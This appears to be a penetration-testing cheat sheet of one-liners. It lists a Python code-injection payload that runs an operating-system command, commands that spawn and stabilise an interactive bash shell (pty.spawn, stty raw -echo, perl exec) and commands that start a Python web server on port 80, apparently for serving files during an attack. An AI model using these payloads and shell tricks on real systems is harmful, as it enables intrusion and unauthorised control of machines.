`__import__('os').system('ls')`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`stty raw -echo` (stty size, stty rows 40 columns 120)  

`perl -e 'exec "/bin/bash";'`

`python -m SimpleHTTPServer 80`

`python3 -m http.server 80`
